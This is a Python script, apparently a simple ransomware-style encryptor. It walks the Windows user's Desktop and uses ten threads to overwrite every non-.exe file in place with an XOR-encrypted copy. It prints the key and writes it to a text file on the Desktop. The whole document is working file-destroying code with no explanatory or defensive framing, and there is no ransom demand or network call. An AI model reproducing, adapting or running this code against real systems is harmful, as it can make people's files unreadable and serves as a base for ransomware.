import os
import threading
import queue
import hashlib
import secrets

def generate_key_from_passphrase(passphrase, key_length=64):
    hash = hashlib.sha256(passphrase.encode()).digest()
    key = ''
    while len(key) < key_length:
        key += hash.hex()
        hash = hashlib.sha256(hash).digest()
    return key[:key_length]

def encrypt(key):
    while True:
        file = q.get()
        if file is None:
            q.task_done()
            break
        try:
            key_index = 0
            max_key_index = len(key) - 1
            with open(file, 'rb') as f:
                data = f.read()
            encrypted_data = bytearray()
            for byte in data:
                encrypted_byte = byte ^ ord(key[key_index])
                encrypted_data.append(encrypted_byte)
                key_index = 0 if key_index >= max_key_index else key_index + 1
            with open(file, 'wb') as f:
                f.write(encrypted_data)
            print(f'{file} successfully encrypted')
        except Exception as e:
            print(f'Failed to encrypt {file}: {e}')
        q.task_done()

desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktop_path)
exclude_files = ['Enc.py', 'Dec.py', os.path.basename(__file__)]
abs_files = [os.path.join(desktop_path, f) for f in files if os.path.isfile(os.path.join(desktop_path, f)) and not f.endswith('.exe') and f not in exclude_files]

# Generate a random passphrase
passphrase = secrets.token_hex(16)  # Generates a random 32-character hexadecimal string
key = generate_key_from_passphrase(passphrase)
print(f"Encryption key: {key} (Save this key to decrypt your files later)")

# Save the key to a file securely
key_path = os.path.join(desktop_path, 'encryption_key.txt')  # Define a path for the key file.
with open(key_path, 'w') as key_file:
    key_file.write(key)  # Write the key to the file.
print(f"Encryption key saved. You will need this key to decrypt your files.")

q = queue.Queue()
for f in abs_files:
    q.put(f)

threads = []
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,))
    t.daemon = True
    t.start()
    threads.append(t)

for _ in range(10):
    q.put(None)

q.join()
for t in threads:
    t.join()

print('Encryption complete')
input("Press any key to exit...")
